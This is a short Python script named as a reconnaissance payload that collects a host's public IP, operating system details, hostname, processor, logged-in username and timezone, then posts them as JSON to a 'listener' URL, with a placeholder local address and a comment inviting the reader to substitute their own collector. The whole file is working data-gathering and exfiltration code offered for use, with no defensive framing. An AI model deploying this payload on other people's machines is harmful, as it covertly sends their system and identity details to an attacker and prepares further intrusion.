#!/usr/bin/env python3

import requests
import platform
import socket
import datetime
from tzlocal import get_localzone
import json
import os

class ReconPayload:
    def __init__(self):
        self.data = {}
    
    def get_public_ip(self):
        """Get public IP address using ipify API"""
        try:
            response = requests.get("https://api.ipify.org?format=json")
            self.data['public_ip'] = response.json()['ip']
        except Exception as e:
            self.data['public_ip'] = f"Error: {str(e)}"
    
    def get_system_info(self):
        """Collect system information"""
        try:
            self.data['system'] = {
                'platform': platform.system(),
                'platform_release': platform.release(),
                'architecture': platform.machine(),
                'hostname': socket.gethostname(),
                'processor': platform.processor(),
                'username': os.getlogin()
            }
        except Exception as e:
            self.data['system'] = f"Error: {str(e)}"
    
    def get_timezone(self):
        """Get system timezone"""
        try:
            self.data['timezone'] = str(get_localzone())
        except Exception as e:
            self.data['timezone'] = f"Error: {str(e)}"
    
    def collect_all(self):
        """Collect all information"""
        self.get_public_ip()
        self.get_system_info()
        self.get_timezone()
        return self.data
    
    def send_data(self, url):
        """Send collected data to the listener"""
        try:
            response = requests.post(url, json=self.data)
            return response.status_code == 200
        except Exception as e:
            return False

if __name__ == "__main__":
    # Example usage
    payload = ReconPayload()
    data = payload.collect_all()
    # Replace with your listener URL
    listener_url = "http://localhost:5000/collect"
    success = payload.send_data(listener_url)
    print("Data sent successfully" if success else "Failed to send data") 